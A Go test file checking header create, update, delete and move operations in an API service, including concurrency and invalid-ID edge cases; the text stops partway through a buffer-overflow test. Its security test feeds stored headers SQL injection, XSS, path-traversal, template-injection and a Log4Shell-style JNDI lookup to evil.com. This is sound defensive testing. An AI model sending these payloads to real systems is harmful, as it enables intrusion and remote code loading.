package rrequest_test

import (
	"context"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"connectrpc.com/connect"
	requestv1 "the-dev-tools/spec/dist/buf/go/collection/item/request/v1"
	resourcesv1 "the-dev-tools/spec/dist/buf/go/resources/v1"
	"the-dev-tools/server/internal/api/rrequest"
	"the-dev-tools/server/pkg/idwrap"
	"the-dev-tools/server/pkg/model/mexampleheader"
	"the-dev-tools/server/pkg/service/sexampleheader"
)

// EdgeCaseTestData provides common test setup for edge case testing
type EdgeCaseTestData struct {
	ctx       context.Context
	rpc       rrequest.RequestRPC
	exampleID idwrap.IDWrap
	userID    idwrap.IDWrap
	ehs       sexampleheader.HeaderService
}

// setupEdgeCaseTestData creates a test environment for edge case testing
func setupEdgeCaseTestData(t *testing.T) *EdgeCaseTestData {
	data := setupHeaderMoveTestData(t)
	return &EdgeCaseTestData{
		ctx:       data.ctx,
		rpc:       data.rpc,
		exampleID: data.exampleID,
		userID:    data.userID,
		ehs:       data.ehs,
	}
}

// createEdgeTestHeader creates a header for edge case testing
func createEdgeTestHeader(t *testing.T, data *EdgeCaseTestData, key, value string) idwrap.IDWrap {
	resp, err := data.rpc.HeaderCreate(data.ctx, connect.NewRequest(&requestv1.HeaderCreateRequest{
		ExampleId:   data.exampleID.Bytes(),
		Key:         key,
		Value:       value,
		Enabled:     true,
		Description: "Test header",
	}))
	if err != nil {
		t.Fatalf("Failed to create test header: %v", err)
	}

	headerID, err := idwrap.NewFromBytes(resp.Msg.GetHeaderId())
	if err != nil {
		t.Fatalf("Failed to parse header ID: %v", err)
	}

	return headerID
}

// TestHeaderEdgeCases_EmptyListOperations tests all operations on empty lists
func TestHeaderEdgeCases_EmptyListOperations(t *testing.T) {
	data := setupEdgeCaseTestData(t)

	t.Run("MoveOnEmptyList", func(t *testing.T) {
		// Attempt to move non-existent headers in empty list
		fakeHeaderID := idwrap.NewNow()
		fakeTargetID := idwrap.NewNow()

		// Collection view move
		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       fakeHeaderID.Bytes(),
			TargetHeaderId: fakeTargetID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err == nil {
			t.Fatal("Expected error when moving headers in empty list")
		}

		// Delta view move
		deltaReq := &requestv1.HeaderDeltaMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       fakeHeaderID.Bytes(),
			TargetHeaderId: fakeTargetID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err = data.rpc.HeaderDeltaMove(data.ctx, connect.NewRequest(deltaReq))
		if err == nil {
			t.Fatal("Expected error when moving delta headers in empty list")
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 0, "EmptyListMoveOperations")
	})

	t.Run("UpdateOnEmptyList", func(t *testing.T) {
		fakeHeaderID := idwrap.NewNow()

		// Collection view update
		testKey := "Test-Key"
		testValue := "Test-Value"
		testEnabled := true
		testDescription := "Test Description"
		updateReq := &requestv1.HeaderUpdateRequest{
			HeaderId:    fakeHeaderID.Bytes(),
			Key:         &testKey,
			Value:       &testValue,
			Enabled:     &testEnabled,
			Description: &testDescription,
		}

		_, err := data.rpc.HeaderUpdate(data.ctx, connect.NewRequest(updateReq))
		if err == nil {
			t.Fatal("Expected error when updating non-existent header")
		}

		// Delta view update
		deltaTestKey := "Test-Key"
		deltaTestValue := "Test-Value"
		deltaTestEnabled := true
		deltaTestDescription := "Test Description"
		deltaUpdateReq := &requestv1.HeaderDeltaUpdateRequest{
			HeaderId:    fakeHeaderID.Bytes(),
			Key:         &deltaTestKey,
			Value:       &deltaTestValue,
			Enabled:     &deltaTestEnabled,
			Description: &deltaTestDescription,
		}

		_, err = data.rpc.HeaderDeltaUpdate(data.ctx, connect.NewRequest(deltaUpdateReq))
		if err == nil {
			t.Fatal("Expected error when updating non-existent delta header")
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 0, "EmptyListUpdateOperations")
	})

	t.Run("DeleteOnEmptyList", func(t *testing.T) {
		fakeHeaderID := idwrap.NewNow()

		// Collection view delete
		deleteReq := &requestv1.HeaderDeleteRequest{
			HeaderId: fakeHeaderID.Bytes(),
		}

		_, err := data.rpc.HeaderDelete(data.ctx, connect.NewRequest(deleteReq))
		if err == nil {
			t.Fatal("Expected error when deleting non-existent header")
		}

		// Delta view delete
		deltaDeleteReq := &requestv1.HeaderDeltaDeleteRequest{
			HeaderId: fakeHeaderID.Bytes(),
		}

		_, err = data.rpc.HeaderDeltaDelete(data.ctx, connect.NewRequest(deltaDeleteReq))
		if err == nil {
			t.Fatal("Expected error when deleting non-existent delta header")
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 0, "EmptyListDeleteOperations")
	})
}

// TestHeaderEdgeCases_SingleItemList tests edge cases with single-item lists
func TestHeaderEdgeCases_SingleItemList(t *testing.T) {
	data := setupEdgeCaseTestData(t)
	headerID := createEdgeTestHeader(t, data, "Single-Header", "Single-Value")

	t.Run("MoveToSelf", func(t *testing.T) {
		// Collection view: Move header to itself (should fail)
		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       headerID.Bytes(),
			TargetHeaderId: headerID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err == nil {
			t.Fatal("Expected error when moving header to itself")
		}

		// Delta view: Move header to itself (should fail)
		deltaReq := &requestv1.HeaderDeltaMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       headerID.Bytes(),
			TargetHeaderId: headerID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err = data.rpc.HeaderDeltaMove(data.ctx, connect.NewRequest(deltaReq))
		if err == nil {
			t.Fatal("Expected error when moving delta header to itself")
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 1, "SingleItemMoveToSelf")
	})

	t.Run("DeleteSingle", func(t *testing.T) {
		// Delete the single header (should succeed)
		deleteReq := &requestv1.HeaderDeleteRequest{
			HeaderId: headerID.Bytes(),
		}

		_, err := data.rpc.HeaderDelete(data.ctx, connect.NewRequest(deleteReq))
		if err != nil {
			t.Fatalf("Failed to delete single header: %v", err)
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 0, "SingleItemDeleted")
	})
}

// TestHeaderEdgeCases_TwoItemSwaps tests all permutations of two-item swaps
func TestHeaderEdgeCases_TwoItemSwaps(t *testing.T) {
	data := setupEdgeCaseTestData(t)
	header1ID := createEdgeTestHeader(t, data, "Header-1", "Value-1")
	header2ID := createEdgeTestHeader(t, data, "Header-2", "Value-2")

	// Test all possible moves between two items
	testCases := []struct {
		name     string
		headerID idwrap.IDWrap
		targetID idwrap.IDWrap
		position resourcesv1.MovePosition
		expected []string
	}{
		{
			name:     "Move1After2",
			headerID: header1ID,
			targetID: header2ID,
			position: resourcesv1.MovePosition_MOVE_POSITION_AFTER,
			expected: []string{"Header-2", "Header-1"},
		},
		{
			name:     "Move1Before2",
			headerID: header1ID,
			targetID: header2ID,
			position: resourcesv1.MovePosition_MOVE_POSITION_BEFORE,
			expected: []string{"Header-1", "Header-2"},
		},
		{
			name:     "Move2After1",
			headerID: header2ID,
			targetID: header1ID,
			position: resourcesv1.MovePosition_MOVE_POSITION_AFTER,
			expected: []string{"Header-1", "Header-2"},
		},
		{
			name:     "Move2Before1",
			headerID: header2ID,
			targetID: header1ID,
			position: resourcesv1.MovePosition_MOVE_POSITION_BEFORE,
			expected: []string{"Header-2", "Header-1"},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Collection view move
			req := &requestv1.HeaderMoveRequest{
				ExampleId:      data.exampleID.Bytes(),
				HeaderId:       tc.headerID.Bytes(),
				TargetHeaderId: tc.targetID.Bytes(),
				Position:       tc.position,
			}

			_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
			if err != nil {
				t.Fatalf("Failed to move header: %v", err)
			}

			// Validate the order
			headers, err := data.ehs.GetHeaderByExampleID(data.ctx, data.exampleID)
			if err != nil {
				t.Fatalf("Failed to get headers: %v", err)
			}

			if len(headers) != 2 {
				t.Fatalf("Expected 2 headers, got %d", len(headers))
			}

			orderedHeaders := orderHeadersByPosition(headers)
			for i, expectedKey := range tc.expected {
				if orderedHeaders[i].HeaderKey != expectedKey {
					t.Errorf("Position %d: expected %s, got %s", i, expectedKey, orderedHeaders[i].HeaderKey)
				}
			}

			validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 2, tc.name)
		})
	}
}

// TestHeaderEdgeCases_InvalidIDs tests all forms of invalid IDs
func TestHeaderEdgeCases_InvalidIDs(t *testing.T) {
	data := setupEdgeCaseTestData(t)

	invalidIDTestCases := []struct {
		name  string
		bytes []byte
	}{
		{"EmptyBytes", []byte{}},
		{"ShortBytes", []byte{1, 2, 3}},
		{"LongBytes", make([]byte, 50)},
		{"NullBytes", nil},
		{"InvalidULIDBytes", []byte("not-a-valid-ulid-at-all")},
		{"MalformedULIDBytes", []byte("01ARZ3NDEKTSV4RRFFQ69G5FAV-INVALID")},
	}

	for _, tc := range invalidIDTestCases {
		t.Run("Move_"+tc.name, func(t *testing.T) {
			// Test invalid header ID
			req := &requestv1.HeaderMoveRequest{
				ExampleId:      data.exampleID.Bytes(),
				HeaderId:       tc.bytes,
				TargetHeaderId: idwrap.NewNow().Bytes(),
				Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
			}

			_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
			if err == nil {
				t.Fatal("Expected error with invalid header ID")
			}

			// Test invalid target ID
			req.HeaderId = idwrap.NewNow().Bytes()
			req.TargetHeaderId = tc.bytes

			_, err = data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
			if err == nil {
				t.Fatal("Expected error with invalid target ID")
			}

			// Test invalid example ID
			req.TargetHeaderId = idwrap.NewNow().Bytes()
			req.ExampleId = tc.bytes

			_, err = data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
			if err == nil {
				t.Fatal("Expected error with invalid example ID")
			}

			validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 0, "InvalidID_"+tc.name)
		})

		t.Run("Update_"+tc.name, func(t *testing.T) {
			testKey := "Test-Key"
			testValue := "Test-Value"
			testEnabled := true
			testDescription := "Test Description"
			req := &requestv1.HeaderUpdateRequest{
				HeaderId:    tc.bytes,
				Key:         &testKey,
				Value:       &testValue,
				Enabled:     &testEnabled,
				Description: &testDescription,
			}

			_, err := data.rpc.HeaderUpdate(data.ctx, connect.NewRequest(req))
			if err == nil {
				t.Fatal("Expected error with invalid header ID")
			}
		})

		t.Run("Delete_"+tc.name, func(t *testing.T) {
			req := &requestv1.HeaderDeleteRequest{
				HeaderId: tc.bytes,
			}

			_, err := data.rpc.HeaderDelete(data.ctx, connect.NewRequest(req))
			if err == nil {
				t.Fatal("Expected error with invalid header ID")
			}
		})
	}
}

// TestHeaderEdgeCases_NonExistentIDs tests operations with valid but non-existent IDs
func TestHeaderEdgeCases_NonExistentIDs(t *testing.T) {
	data := setupEdgeCaseTestData(t)
	nonExistentID := idwrap.NewNow()

	t.Run("MoveNonExistentHeader", func(t *testing.T) {
		validHeaderID := createEdgeTestHeader(t, data, "Valid-Header", "Valid-Value")

		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       nonExistentID.Bytes(),
			TargetHeaderId: validHeaderID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err == nil {
			t.Fatal("Expected error when moving non-existent header")
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 1, "MoveNonExistentHeader")
	})

	t.Run("MoveToNonExistentTarget", func(t *testing.T) {
		validHeaderID := createEdgeTestHeader(t, data, "Valid-Header-2", "Valid-Value-2")

		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       validHeaderID.Bytes(),
			TargetHeaderId: nonExistentID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err == nil {
			t.Fatal("Expected error when moving to non-existent target")
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 2, "MoveToNonExistentTarget")
	})

	t.Run("UpdateNonExistentHeader", func(t *testing.T) {
		testKey := "Test-Key"
		testValue := "Test-Value"
		testEnabled := true
		testDescription := "Test Description"
		req := &requestv1.HeaderUpdateRequest{
			HeaderId:    nonExistentID.Bytes(),
			Key:         &testKey,
			Value:       &testValue,
			Enabled:     &testEnabled,
			Description: &testDescription,
		}

		_, err := data.rpc.HeaderUpdate(data.ctx, connect.NewRequest(req))
		if err == nil {
			t.Fatal("Expected error when updating non-existent header")
		}
	})

	t.Run("DeleteNonExistentHeader", func(t *testing.T) {
		req := &requestv1.HeaderDeleteRequest{
			HeaderId: nonExistentID.Bytes(),
		}

		_, err := data.rpc.HeaderDelete(data.ctx, connect.NewRequest(req))
		if err == nil {
			t.Fatal("Expected error when deleting non-existent header")
		}
	})
}

// TestHeaderEdgeCases_ConcurrentOperations tests race conditions and concurrent access
func TestHeaderEdgeCases_ConcurrentOperations(t *testing.T) {
	data := setupEdgeCaseTestData(t)

	t.Run("ConcurrentMoves", func(t *testing.T) {
		// Create multiple headers
		headerIDs := make([]idwrap.IDWrap, 10)
		for i := 0; i < 10; i++ {
			headerIDs[i] = createEdgeTestHeader(t, data, fmt.Sprintf("Header-%d", i), fmt.Sprintf("Value-%d", i))
		}

		// Perform concurrent moves
		const numGoroutines = 5
		var wg sync.WaitGroup
		errors := make(chan error, numGoroutines)

		for i := 0; i < numGoroutines; i++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()

				// Each goroutine performs multiple moves
				for j := 0; j < 3; j++ {
					headerIdx := (index + j) % len(headerIDs)
					targetIdx := (headerIdx + 1) % len(headerIDs)

					req := &requestv1.HeaderMoveRequest{
						ExampleId:      data.exampleID.Bytes(),
						HeaderId:       headerIDs[headerIdx].Bytes(),
						TargetHeaderId: headerIDs[targetIdx].Bytes(),
						Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
					}

					_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
					if err != nil && !strings.Contains(err.Error(), "cannot move header relative to itself") {
						errors <- err
						return
					}

					// Small delay to increase chance of race conditions
					time.Sleep(time.Millisecond)
				}
			}(i)
		}

		wg.Wait()
		close(errors)

		// Check for errors
		for err := range errors {
			t.Errorf("Concurrent operation error: %v", err)
		}

		// Validate final integrity
		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 10, "ConcurrentMoves")
	})

	t.Run("ConcurrentCreateAndMove", func(t *testing.T) {
		const numGoroutines = 3
		var wg sync.WaitGroup
		createdHeaders := make(chan idwrap.IDWrap, numGoroutines*2)

		// Concurrent header creation
		for i := 0; i < numGoroutines; i++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()

				headerID := createEdgeTestHeader(t, data, fmt.Sprintf("Concurrent-%d", index), fmt.Sprintf("ConcurrentValue-%d", index))
				createdHeaders <- headerID
			}(i)
		}

		wg.Wait()
		close(createdHeaders)

		// Collect created headers
		var headerList []idwrap.IDWrap
		for headerID := range createdHeaders {
			headerList = append(headerList, headerID)
		}

		// Concurrent moves of created headers
		for i := 0; i < len(headerList)-1; i++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()

				req := &requestv1.HeaderMoveRequest{
					ExampleId:      data.exampleID.Bytes(),
					HeaderId:       headerList[index].Bytes(),
					TargetHeaderId: headerList[(index+1)%len(headerList)].Bytes(),
					Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
				}

				_, _ = data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
			}(i)
		}

		wg.Wait()

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, numGoroutines+10, "ConcurrentCreateAndMove")
	})

	t.Run("ConcurrentUpdateAndMove", func(t *testing.T) {
		// Create base headers
		headerIDs := make([]idwrap.IDWrap, 5)
		for i := 0; i < 5; i++ {
			headerIDs[i] = createEdgeTestHeader(t, data, fmt.Sprintf("UpdateMove-%d", i), fmt.Sprintf("UpdateMoveValue-%d", i))
		}

		const numGoroutines = 3
		var wg sync.WaitGroup

		// Concurrent updates and moves
		for i := 0; i < numGoroutines; i++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()

				headerIdx := index % len(headerIDs)

				// Update
				updatedKey := fmt.Sprintf("Updated-%d", index)
				updatedValue := fmt.Sprintf("UpdatedValue-%d", index)
				updatedEnabled := true
				updatedDescription := fmt.Sprintf("Updated description %d", index)
				updateReq := &requestv1.HeaderUpdateRequest{
					HeaderId:    headerIDs[headerIdx].Bytes(),
					Key:         &updatedKey,
					Value:       &updatedValue,
					Enabled:     &updatedEnabled,
					Description: &updatedDescription,
				}

				_, _ = data.rpc.HeaderUpdate(data.ctx, connect.NewRequest(updateReq))

				// Move
				targetIdx := (headerIdx + 1) % len(headerIDs)
				moveReq := &requestv1.HeaderMoveRequest{
					ExampleId:      data.exampleID.Bytes(),
					HeaderId:       headerIDs[headerIdx].Bytes(),
					TargetHeaderId: headerIDs[targetIdx].Bytes(),
					Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
				}

				_, _ = data.rpc.HeaderMove(data.ctx, connect.NewRequest(moveReq))
			}(i)
		}

		wg.Wait()

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 5+numGoroutines+10, "ConcurrentUpdateAndMove")
	})
}

// TestHeaderEdgeCases_ResourceLimits tests performance and memory limits
func TestHeaderEdgeCases_ResourceLimits(t *testing.T) {
	// Skip in short tests due to performance impact
	if testing.Short() {
		t.Skip("Skipping resource limit tests in short mode")
	}

	data := setupEdgeCaseTestData(t)

	t.Run("LargeHeaderCount", func(t *testing.T) {
		const maxHeaders = 1000 // Reduced from 10000 for reasonable test time

		// Create many headers
		headerIDs := make([]idwrap.IDWrap, maxHeaders)
		for i := 0; i < maxHeaders; i++ {
			headerIDs[i] = createEdgeTestHeader(t, data, fmt.Sprintf("Header-%06d", i), fmt.Sprintf("Value-%06d", i))

			// Log progress every 100 headers
			if (i+1)%100 == 0 {
				t.Logf("Created %d/%d headers", i+1, maxHeaders)
			}
		}

		t.Logf("Successfully created %d headers", maxHeaders)

		// Test operations on large list
		startTime := time.Now()

		// Move a header from beginning to end
		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       headerIDs[0].Bytes(),
			TargetHeaderId: headerIDs[maxHeaders-1].Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err != nil {
			t.Fatalf("Failed to move header in large list: %v", err)
		}

		moveTime := time.Since(startTime)
		t.Logf("Move operation took %v", moveTime)

		// Validate list integrity (this might be slow)
		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, maxHeaders, "LargeHeaderCount")
	})

	t.Run("VeryLongHeaderValues", func(t *testing.T) {
		// Test with extremely long header keys and values
		longKey := strings.Repeat("VeryLongHeaderKey", 100)    // ~1.7KB
		longValue := strings.Repeat("VeryLongHeaderValue", 100) // ~2.0KB
		longDescription := strings.Repeat("VeryLongDescription", 100) // ~2.0KB

		// Ensure we don't exceed reasonable limits
		if len(longKey) > 10000 {
			longKey = longKey[:10000]
		}
		if len(longValue) > 10000 {
			longValue = longValue[:10000]
		}
		if len(longDescription) > 10000 {
			longDescription = longDescription[:10000]
		}

		headerID := createEdgeTestHeader(t, data, longKey, longValue)

		// Update with long description
		longEnabled := true
		updateReq := &requestv1.HeaderUpdateRequest{
			HeaderId:    headerID.Bytes(),
			Key:         &longKey,
			Value:       &longValue,
			Enabled:     &longEnabled,
			Description: &longDescription,
		}

		_, err := data.rpc.HeaderUpdate(data.ctx, connect.NewRequest(updateReq))
		if err != nil {
			t.Fatalf("Failed to update header with long values: %v", err)
		}

		// Count current headers (may include previous test artifacts)
		currentHeaders, err := data.ehs.GetHeaderByExampleID(data.ctx, data.exampleID)
		if err != nil {
			t.Fatalf("Failed to get current headers: %v", err)
		}
		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, len(currentHeaders), "VeryLongHeaderValues")
	})

	t.Run("MemoryUsage", func(t *testing.T) {
		// Monitor memory usage during header operations
		var m1, m2 runtime.MemStats

		runtime.GC()
		runtime.ReadMemStats(&m1)

		// Create moderate number of headers
		const headerCount = 500
		for i := 0; i < headerCount; i++ {
			createEdgeTestHeader(t, data, fmt.Sprintf("MemTest-%d", i), fmt.Sprintf("MemValue-%d", i))
		}

		runtime.GC()
		runtime.ReadMemStats(&m2)

		// Handle potential overflow in memory calculation
		var memUsed uint64
		if m2.Alloc >= m1.Alloc {
			memUsed = m2.Alloc - m1.Alloc
		} else {
			// Handle overflow or measurement error
			memUsed = m2.Alloc
		}
		
		t.Logf("Memory used for %d headers: %d bytes (%.2f MB)", headerCount, memUsed, float64(memUsed)/1024/1024)

		// Memory usage should be reasonable (less than 100MB for 500 headers)
		// Only check if we got a reasonable measurement
		if memUsed > 0 && memUsed < 1024*1024*1024 && memUsed > 100*1024*1024 {
			t.Errorf("Excessive memory usage: %d bytes", memUsed)
		}

		// Count current headers (may include previous test artifacts)
		currentHeaders, err := data.ehs.GetHeaderByExampleID(data.ctx, data.exampleID)
		if err != nil {
			t.Fatalf("Failed to get current headers: %v", err)
		}
		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, len(currentHeaders), "MemoryUsage")
	})
}

// TestHeaderEdgeCases_CircularReferences tests prevention of circular references
func TestHeaderEdgeCases_CircularReferences(t *testing.T) {
	data := setupEdgeCaseTestData(t)

	t.Run("DirectCircularReference", func(t *testing.T) {
		// Create headers
		header1ID := createEdgeTestHeader(t, data, "Header-1", "Value-1")
		header2ID := createEdgeTestHeader(t, data, "Header-2", "Value-2")
		header3ID := createEdgeTestHeader(t, data, "Header-3", "Value-3")

		// Create a potential circular reference: 1 -> 2 -> 3 -> 1
		// Move 2 after 1
		req1 := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       header2ID.Bytes(),
			TargetHeaderId: header1ID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req1))
		if err != nil {
			t.Fatalf("Failed first move: %v", err)
		}

		// Move 3 after 2
		req2 := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       header3ID.Bytes(),
			TargetHeaderId: header2ID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err = data.rpc.HeaderMove(data.ctx, connect.NewRequest(req2))
		if err != nil {
			t.Fatalf("Failed second move: %v", err)
		}

		// The system should prevent true circular references
		// and maintain a proper linked list structure
		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 3, "CircularReference")
	})

	t.Run("ComplexCircularAttempt", func(t *testing.T) {
		// Create a more complex scenario with multiple headers
		const headerCount = 6
		headerIDs := make([]idwrap.IDWrap, headerCount)
		for i := 0; i < headerCount; i++ {
			headerIDs[i] = createEdgeTestHeader(t, data, fmt.Sprintf("Complex-%d", i), fmt.Sprintf("ComplexValue-%d", i))
		}

		// Perform a series of moves that could potentially create cycles
		moves := []struct {
			headerIdx, targetIdx int
			position             resourcesv1.MovePosition
		}{
			{0, 1, resourcesv1.MovePosition_MOVE_POSITION_AFTER},
			{2, 0, resourcesv1.MovePosition_MOVE_POSITION_AFTER},
			{3, 2, resourcesv1.MovePosition_MOVE_POSITION_AFTER},
			{1, 3, resourcesv1.MovePosition_MOVE_POSITION_AFTER},
			{4, 1, resourcesv1.MovePosition_MOVE_POSITION_BEFORE},
			{5, 4, resourcesv1.MovePosition_MOVE_POSITION_BEFORE},
		}

		for i, move := range moves {
			req := &requestv1.HeaderMoveRequest{
				ExampleId:      data.exampleID.Bytes(),
				HeaderId:       headerIDs[move.headerIdx].Bytes(),
				TargetHeaderId: headerIDs[move.targetIdx].Bytes(),
				Position:       move.position,
			}

			_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
			if err != nil && !strings.Contains(err.Error(), "cannot move header relative to itself") {
				t.Logf("Move %d failed (expected for some cases): %v", i, err)
			}

			// Validate integrity after each move
			validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, headerCount+3, fmt.Sprintf("ComplexMove_%d", i))
		}
	})
}

// TestHeaderEdgeCases_OrphanedHeaders tests handling of orphaned headers
func TestHeaderEdgeCases_OrphanedHeaders(t *testing.T) {
	data := setupEdgeCaseTestData(t)

	t.Run("OrphanedHeaderDetection", func(t *testing.T) {
		// Create headers
		header1ID := createEdgeTestHeader(t, data, "Header-1", "Value-1")
		header2ID := createEdgeTestHeader(t, data, "Header-2", "Value-2")
		_ = createEdgeTestHeader(t, data, "Header-3", "Value-3")

		// Get the headers to manipulate prev/next pointers directly (if possible)
		headers, err := data.ehs.GetHeaderByExampleID(data.ctx, data.exampleID)
		if err != nil {
			t.Fatalf("Failed to get headers: %v", err)
		}

		if len(headers) != 3 {
			t.Fatalf("Expected 3 headers, got %d", len(headers))
		}

		// Test normal operations on these headers to ensure they work correctly
		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       header2ID.Bytes(),
			TargetHeaderId: header1ID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_BEFORE,
		}

		_, err = data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err != nil {
			t.Fatalf("Failed to move header: %v", err)
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 3, "OrphanHandling")
	})
}

// TestHeaderEdgeCases_NullPointers tests null pointer handling
func TestHeaderEdgeCases_NullPointers(t *testing.T) {
	data := setupEdgeCaseTestData(t)

	t.Run("NullPointerOperations", func(t *testing.T) {
		// Test operations with headers that have null prev/next pointers
		headerID := createEdgeTestHeader(t, data, "NullTest", "NullValue")

		// Get the header to examine its structure
		header, err := data.ehs.GetHeaderByID(data.ctx, headerID)
		if err != nil {
			t.Fatalf("Failed to get header: %v", err)
		}

		// Single header should have null prev/next
		if header.Prev != nil {
			t.Errorf("Expected nil Prev for single header, got: %v", header.Prev)
		}
		if header.Next != nil {
			t.Errorf("Expected nil Next for single header, got: %v", header.Next)
		}

		// Test moving this single header (should fail gracefully)
		fakeTargetID := idwrap.NewNow()
		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       headerID.Bytes(),
			TargetHeaderId: fakeTargetID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err = data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err == nil {
			t.Fatal("Expected error when moving to non-existent target")
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 1, "NullPointerOperations")
	})
}

// TestHeaderEdgeCases_SecurityValidation tests security-related edge cases
func TestHeaderEdgeCases_SecurityValidation(t *testing.T) {
	data := setupEdgeCaseTestData(t)

	t.Run("SQLInjectionAttempts", func(t *testing.T) {
		// Test potential SQL injection in header keys and values
		injectionAttempts := []string{
			"'; DROP TABLE headers; --",
			"' OR 1=1; --",
			"'; UPDATE headers SET value='hacked'; --",
			"<script>alert('xss')</script>",
			"../../../etc/passwd",
			"${jndi:ldap://evil.com/a}",
			"{{7*7}}",
		}

		for i, injection := range injectionAttempts {
			t.Run(fmt.Sprintf("Injection_%d", i), func(t *testing.T) {
				// Try to create header with injection attempt
				headerID := createEdgeTestHeader(t, data, fmt.Sprintf("Injection-%d", i), injection)

				// Verify header was created safely
				header, err := data.ehs.GetHeaderByID(data.ctx, headerID)
				if err != nil {
					t.Fatalf("Failed to get header: %v", err)
				}

				// Value should be stored as-is (not executed)
				if header.Value != injection {
					t.Errorf("Header value was modified: expected %s, got %s", injection, header.Value)
				}

				// Try updating with injection
				injectionEnabled := true
				updateReq := &requestv1.HeaderUpdateRequest{
					HeaderId:    headerID.Bytes(),
					Key:         &injection,
					Value:       &injection,
					Enabled:     &injectionEnabled,
					Description: &injection,
				}

				_, err = data.rpc.HeaderUpdate(data.ctx, connect.NewRequest(updateReq))
				if err != nil {
					t.Fatalf("Failed to update header with injection attempt: %v", err)
				}

				validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, i+1, fmt.Sprintf("SQLInjection_%d", i))
			})
		}
	})

	t.Run("BufferOverflowAttempts", func(t *testing.T) {
		// Test extremely large inputs
		veryLargeString := strings.Repeat("A", 100000) // 100KB string

		// This should be handled gracefully (either accepted or rejected cleanly)
		headerID := createEdgeTestHeader(t, data, "BufferTest", "NormalValue")

		veryLargeEnabled := true
		updateReq := &requestv1.HeaderUpdateRequest{
			HeaderId:    headerID.Bytes(),
			Key:         &veryLargeString,
			Value:       &veryLargeString,
			Enabled:     &veryLargeEnabled,
			Description: &veryLargeString,
		}

		_, err := data.rpc.HeaderUpdate(data.ctx, connect.NewRequest(updateReq))
		// This might succeed or fail, but should not crash
